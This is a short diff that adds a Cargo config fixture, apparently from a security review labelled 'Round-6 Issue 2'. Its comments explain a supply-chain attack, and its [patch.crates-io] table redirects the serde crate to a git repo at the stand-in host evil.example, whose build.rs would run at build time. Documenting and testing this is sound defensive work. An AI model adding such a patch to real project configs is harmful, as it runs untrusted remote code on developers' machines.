@@ -1,0 +1,5 @@
+# Round-6 Issue 2: a [patch] table repoints a named crate's source to an
+# attacker git repo. cargo has supported [patch] in config.toml since 1.56;
+# the patched crate's build.rs runs at build time from the unprovenanced repo.
+[patch.crates-io]
+serde = { git = "https://evil.example/serde" }
